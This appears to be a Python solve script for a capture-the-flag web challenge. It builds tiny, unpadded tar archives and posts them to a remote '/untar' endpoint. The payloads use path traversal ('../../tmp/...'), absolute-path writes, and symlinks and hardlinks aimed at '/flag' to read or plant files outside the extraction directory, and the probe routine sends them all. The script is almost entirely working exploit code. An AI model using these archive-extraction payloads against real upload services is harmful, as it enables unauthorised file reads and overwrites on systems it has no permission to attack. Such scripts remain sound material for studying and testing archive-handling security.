from __future__ import annotations

import argparse
import io
import json
import tarfile
from pathlib import Path

import requests


BASE_URL = "http://chall.blackpinker.com:20937"


def _checksum(header: bytearray) -> int:
    check_header = bytearray(header)
    check_header[148:156] = b"        "
    return sum(check_header)


def raw_file_tar(name: str, data: bytes, mode: int = 0o644) -> bytes:
    """Build a deliberately short tar: one header plus unpadded file data."""
    if len(name.encode()) > 100:
        raise ValueError("name too long for simple ustar header")
    header = bytearray(512)
    header[0 : len(name)] = name.encode()
    header[100:108] = f"{mode:07o}\0".encode()
    header[108:116] = b"0000000\0"
    header[116:124] = b"0000000\0"
    header[124:136] = f"{len(data):011o}\0".encode()
    header[136:148] = b"00000000000\0"
    header[156:157] = b"0"
    header[257:263] = b"ustar\0"
    header[263:265] = b"00"
    header[148:156] = f"{_checksum(header):06o}\0 ".encode()
    return bytes(header) + data


def tiny_tar(entries: list[tuple[str, bytes]]) -> bytes:
    """Build a tar archive with no end-of-archive padding to fit under 1 KiB."""
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w") as tar:
        for name, data in entries:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    data = out.getvalue()

    # Python's tarfile writes two zero blocks and pads to RECORDSIZE. Most
    # extractors only need a complete member block for these tests.
    while data.endswith(b"\0" * 512):
        data = data[:-512]
    return data


def tiny_symlink(name: str, target: str) -> bytes:
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w") as tar:
        info = tarfile.TarInfo(name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        info.mode = 0o777
        tar.addfile(info)
    data = out.getvalue()
    while data.endswith(b"\0" * 512):
        data = data[:-512]
    return data


def tiny_hardlink(name: str, target: str) -> bytes:
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w") as tar:
        info = tarfile.TarInfo(name)
        info.type = tarfile.LNKTYPE
        info.linkname = target
        info.mode = 0o644
        tar.addfile(info)
    data = out.getvalue()
    while data.endswith(b"\0" * 512):
        data = data[:-512]
    return data


def tiny_empty_file(name: str) -> bytes:
    return tiny_tar([(name, b"")])


def post_tar(payload: bytes, filename: str = "x.tar") -> requests.Response:
    files = {"file": (filename, payload, "application/x-tar")}
    return requests.post(f"{BASE_URL}/untar", files=files, timeout=30)


def show_response(label: str, response: requests.Response) -> None:
    print(f"== {label} ==")
    print(f"status: {response.status_code}")
    print(f"content-type: {response.headers.get('content-type')}")
    body = response.text
    try:
        print(json.dumps(response.json(), indent=2))
    except ValueError:
        print(body[:1000])
    print()


def probe() -> None:
    cases = {
        "empty": tiny_empty_file("empty.txt"),
        "raw_small": raw_file_tar("raw.txt", b"raw\n"),
        "raw_static": raw_file_tar("/proc/self/cwd/static/rawflag.txt", b"raw-static\n"),
        "raw_tmp": raw_file_tar("/tmp/target_raw_probe.txt", b"raw-tmp\n"),
        "symlink_flag": tiny_symlink("flag.txt", "/flag"),
        "traversal_symlink_flag": tiny_symlink("../../tmp/flag.txt", "/flag"),
        "hardlink_flag": tiny_hardlink("flag_hard.txt", "/flag"),
    }
    for label, payload in cases.items():
        print(f"{label} payload size: {len(payload)}")
        response = post_tar(payload)
        show_response(label, response)


def save_payloads() -> None:
    out_dir = Path(__file__).resolve().parent / "payloads"
    out_dir.mkdir(exist_ok=True)
    payloads = {
        "normal.tar": tiny_tar([("hello.txt", b"hello\n")]),
        "traversal.tar": tiny_tar([("../../tmp/target_probe.txt", b"owned\n")]),
    }
    for name, payload in payloads.items():
        (out_dir / name).write_bytes(payload)
        print(name, len(payload))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--save-payloads", action="store_true")
    args = parser.parse_args()

    if args.save_payloads:
        save_payloads()
    else:
        probe()


if __name__ == "__main__":
    main()
